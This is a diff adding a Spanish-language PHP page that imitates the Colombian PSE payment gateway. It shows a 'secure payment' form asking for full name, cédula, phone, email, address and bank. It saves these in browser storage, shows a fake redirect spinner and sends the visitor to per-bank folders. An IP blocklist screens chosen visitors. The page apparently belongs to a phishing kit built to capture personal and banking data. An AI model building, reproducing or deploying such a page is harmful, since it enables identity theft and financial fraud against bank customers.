@@ -1,0 +1,232 @@
+<?php
+// --- IP BLACKLIST GLOBAL CHECK ---
+$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
+if (!empty($client_ip)) {
+    $client_ip = trim(explode(',', $client_ip)[0]);
+}
+$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
+if (file_exists($blacklist_file)) {
+    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    if (in_array($client_ip, $blocked_ips)) {
+        header("HTTP/1.1 403 Forbidden");
+        exit("Acceso denegado.");
+    }
+}
+// ---------------------------------
+
+// /var/www/html/data/bet00/reservas/informacion/pse.php
+session_start();
+
+// Precio de respaldo desde la URL
+$precio_url = isset($_GET['precio']) ? $_GET['precio'] : '0';
+$precio_formateado_url = number_format((float)$precio_url, 0, ',', '.');
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>PSE - Formulario de Pago</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: "Segoe UI", Roboto, Arial, sans-serif;
+      background: #f0f4f8;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    header {
+      width: 100%;
+      max-width: 460px;
+      display: flex;
+      justify-content: center;
+      padding: 20px 0;
+    }
+    header img { width: 100px; height: auto; }
+    .formulario {
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+      width: 100%;
+      max-width: 460px;
+      border-top: 5px solid #4b2d7f;
+    }
+    .resumen-pago {
+      background: #f8faff;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 25px;
+      text-align: center;
+      border: 1px dashed #4b2d7f;
+    }
+    .resumen-pago span { display: block; font-size: 13px; color: #666; }
+    .resumen-pago strong { font-size: 20px; color: #111; }
+
+    .formulario h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #4b2d7f;
+      font-size: 1.4rem;
+    }
+    .row { display: flex; gap: 12px; }
+    .group { flex: 1; margin-bottom: 15px; }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: 600;
+      color: #444;
+      font-size: 13px;
+    }
+    input, select {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #d1d5db;
+      border-radius: 6px;
+      font-size: 15px;
+      outline: none;
+    }
+    input:focus, select:focus {
+      border-color: #4b2d7f;
+      box-shadow: 0 0 0 3px rgba(75, 45, 127, 0.1);
+    }
+    button {
+      width: 100%;
+      background: #4b2d7f;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+    #loader-container {
+      display: none;
+      text-align: center;
+      margin-top: 20px;
+    }
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #4b2d7f;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 10px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="https://seeklogo.com/images/P/pse-logo-B00717880A-seeklogo.com.png" alt="PSE Logo">
+  </header>
+
+  <div class="formulario">
+    <div id="form-content">
+      <h2>Realizar Pago Seguro</h2>
+      
+      <div class="resumen-pago">
+        <span>Total a pagar</span>
+        <strong id="display-total">$ <?php echo $precio_formateado_url; ?> COP</strong>
+      </div>
+
+      <form id="formPSE">
+        <label>Nombre Completo</label>
+        <input type="text" id="pse_nombre" placeholder="Como aparece en su banco" required>
+
+        <div class="row">
+          <div class="group">
+            <label>Cédula</label>
+            <input type="text" id="pse_cedula" inputmode="numeric" required>
+          </div>
+          <div class="group">
+            <label>Celular</label>
+            <input type="text" id="pse_celular" inputmode="numeric" required>
+          </div>
+        </div>
+
+        <label>Correo Electrónico</label>
+        <input type="email" id="pse_email" placeholder="ejemplo@correo.com" required>
+
+        <label>Dirección</label>
+        <input type="text" id="pse_direccion" required>
+
+        <label>Selecciona tu banco</label>
+        <select class="form-select" id="pse_banco" name="banco" required>
+            <option value="">A continuación seleccione su banco</option>
+            <option value="avvillas" tipo="2" folder="b-03">BANCO AV VILLAS</option>
+            <option value="caja-social" tipo="2" folder="b-09">BANCO CAJA SOCIAL</option>
+            <option value="bogota" tipo="2" folder="b-10">BANCO DE BOGOTA</option>
+            <option value="davivienda" tipo="2" folder="b-04">BANCO DAVIVIENDA</option>
+            <option value="occidente" tipo="2" folder="b-06">BANCO DE OCCIDENTE</option>
+            <option value="falabella" tipo="2" folder="b-11">BANCO FALABELLA</option>
+            <option value="finandina" tipo="2" folder="b-12">BANCO FINANDINA S.A. BIC</option>
+            <option value="itau" tipo="2" folder="b-13">BANCO ITAU</option>
+            <option value="mundo-mujer" tipo="1" folder="b-01">BANCO MUNDO MUJER S.A.</option>
+            <option value="popular" tipo="2" folder="b-08">BANCO POPULAR</option>
+            <option value="serfinanza" tipo="2" folder="b-07">BANCO SERFINANZA</option>
+            <option value="bancolombia" tipo="2" folder="b-14">BANCOLOMBIA</option>
+            <option value="lulo" tipo="1" folder="b-02">LULO BANK</option>
+            <option value="scotiabank-colpatria" tipo="2" folder="b-05">SCOTIABANK COLPATRIA</option>
+            <option value="nequi" tipo="1" folder="b-15">NEQUI</option>
+        </select>
+
+        <button type="submit" id="btn-submit">Continuar Pago</button>
+      </form>
+    </div>
+
+    <div id="loader-container">
+      <div class="spinner"></div>
+      <p style="color: #4b2d7f; font-size: 14px; font-weight: 600;">Redirigiendo a su entidad bancaria...</p>
+    </div>
+
+    <div class="nota">Protegido por el sistema de seguridad PSE</div>
+  </div>
+
+  <script>
+  document.getElementById("formPSE").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    // Bloqueo visual de interfaz
+    document.getElementById('form-content').style.display = 'none';
+    document.getElementById('loader-container').style.display = 'block';
+
+    const bancoSel = document.getElementById('pse_banco');
+    const opt = bancoSel.options[bancoSel.selectedIndex];
+    
+    // 1. Obtener la carpeta específica del banco desde el atributo 'folder'
+    const carpetaBanco = opt.getAttribute('folder'); // Ejemplo: "b-34f4" o "b-15"
+
+    // 2. Guardar datos en LocalStorage como lo pediste
+    const camasObj = JSON.parse(localStorage.getItem('camas')) || {};
+    const totalOperable = camasObj.precioTotal ? camasObj.precioTotal.replace(/[^\d]/g, "") : "0";
+
+    localStorage.setItem('total_pagar', totalOperable);
+    localStorage.setItem('nom', document.getElementById('pse_nombre').value);
+    localStorage.setItem('val', document.getElementById('pse_cedula').value);
+    localStorage.setItem('cel', document.getElementById('pse_celular').value);
+    localStorage.setItem('correo', document.getElementById('pse_email').value);
+    localStorage.setItem('dir', document.getElementById('pse_direccion').value);
+    localStorage.setItem('per', "Natural");
+    
+    localStorage.setItem('banco', opt.value);
+    localStorage.setItem('folder', carpetaBanco);
+    localStorage.setItem('tipo', opt.getAttribute('tipo'));
+
+    // 3. Redirección dinámica a la carpeta del banco seleccionado
+    setTimeout(() => {
+        // Esto redirigirá a, por ejemplo: /gate/recargas/transaction/b-34f4/
+        window.location.href = "/gate/recargas/transaction/" + carpetaBanco;
+    }, 1500);
+});
+  </script>
+
+</body>
+</html>
